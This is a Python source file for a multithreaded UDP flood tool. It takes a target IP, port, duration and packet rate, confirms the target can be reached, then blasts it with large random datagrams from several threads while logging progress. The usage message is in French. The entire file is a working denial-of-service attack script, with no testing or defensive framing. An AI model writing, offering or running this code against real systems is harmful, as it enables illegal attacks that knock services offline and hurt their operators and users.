import socket
import random
import time
import logging
import threading
import sys

def check_udp_target(ip, port):
    print(f"[INFO] Checking UDP target {ip}:{port} ...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        sock.sendto(b"ping", (ip, port))
        sock.close()
        print("[INFO] UDP target reachable.")
        return True
    except Exception as e:
        print(f"UDP target connection error: {e}")
        return False

def udp_worker(target_ip, target_port, stop_event, pps, stats, weight):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    min_size = 64
    max_size = 65507
    size = min_size + int((max_size - min_size) * (weight - 1) / 9)
    bytes_to_send = random._urandom(size)
    while not stop_event.is_set():
        start = time.time()
        sent = 0
        for _ in range(pps):
            if stop_event.is_set():
                break
            try:
                sock.sendto(bytes_to_send, (target_ip, target_port))
                sent += 1
            except Exception:
                pass
        stats['sent'] += sent
        elapsed = time.time() - start
        if elapsed < 1:
            time.sleep(1 - elapsed)

def udp_flood(target_ip, target_port, duration, pps, threads=1, weight=1):
    print(f"[INFO] Starting UDP flood on {target_ip}:{target_port} ({threads} threads, {pps} pps, {duration}s, weight {weight})")
    logger = logging.getLogger("udp_flood")
    handler = logging.FileHandler("udp_flood.log")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)

    if not check_udp_target(target_ip, target_port):
        print("UDP target unreachable.")
        return

    logger.info(f"Started UDP flood on {target_ip}:{target_port} for {duration}s at {pps} pps, {threads} threads, weight {weight}.")
    print(f"[INFO] UDP flood started on {target_ip}:{target_port} for {duration}s at {pps} pps, {threads} threads, weight {weight}.")

    stop_event = threading.Event()
    stats = {'sent': 0}
    thread_list = []
    try:
        for _ in range(threads):
            t = threading.Thread(target=udp_worker, args=(target_ip, target_port, stop_event, pps, stats, weight))
            t.daemon = True
            t.start()
            thread_list.append(t)
        start_time = time.time()
        while time.time() - start_time < duration:
            print(f"\r[PROGRESS] Packets sent: {stats['sent']}", end='', flush=True)
            time.sleep(0.5)
        stop_event.set()
    except KeyboardInterrupt:
        print("\n[INFO] Early stop requested.")
        stop_event.set()
    for t in thread_list:
        t.join()
    print(f"\n[INFO] UDP flood finished. Total packets sent: {stats['sent']}")
    logger.info(f"UDP flood finished. Total packets sent: {stats['sent']}")
    handler.close()
    logger.removeHandler(handler)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 5:
        print(f"Usage: python {sys.argv[0]} <IP cible> <Port cible> <Durée en secondes> <Cadence (pps)>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    pps = int(sys.argv[4])
    udp_flood(target_ip, target_port, duration, pps)
